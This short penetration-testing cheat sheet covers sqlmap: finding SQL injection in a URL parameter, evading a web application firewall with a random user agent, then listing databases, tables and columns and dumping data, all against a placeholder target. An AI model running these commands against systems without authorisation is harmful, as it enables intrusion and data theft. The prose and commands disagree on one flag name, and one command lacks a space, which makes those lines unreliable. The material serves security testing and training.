# Database enumeration

## sqlmap

[sqlmap](https://www.kali.org/tools/sqlmap/) attempts to automatically identify and exploit SQL injection when supplied with a target URL.

Refer to the [wiki](https://github.com/sqlmapproject/sqlmap/wiki/Features) for an exhaustive breakdown of the features.

Examples:

Identify a page in the target web application that displays data and note the URL.

Use a standard HTTP GET based request against a URI with a request parameter (`?id=1`). This will test different SQL injection methods against the `id` parameter.
    
    # sqlmap -u http://urloftargetpage/page.php?id=1

When blocked by a Web Application Firewall (WAF), try using a different user agent with the `--randomagent` parameter.

    # sqlmap -u http://urloftargetpage/page.php?id=1 --random-agent

If SQL injections are successful, the `--dbs` parameter gives information about the database, such as the type of database and the database name.

    sqlmap -u http://urloftargetpage/page.php?id=1 --dbs

List information about tables present in a particular database:

    # sqlmap -u http://urloftargetpage/page.php?id=1 -D <databasename> --tables

List information about the columns of a particular table:

    # sqlmap -u http://urloftargetpage/page.php?id=1 -D <databasename> -T <tablenname> --columns

Dump data:

    # sqlmap -u http://urloftargetpage/page.php?id=1 -D <databasename> -T <tablename> -C <multiple columnnames separated by commas>--dump
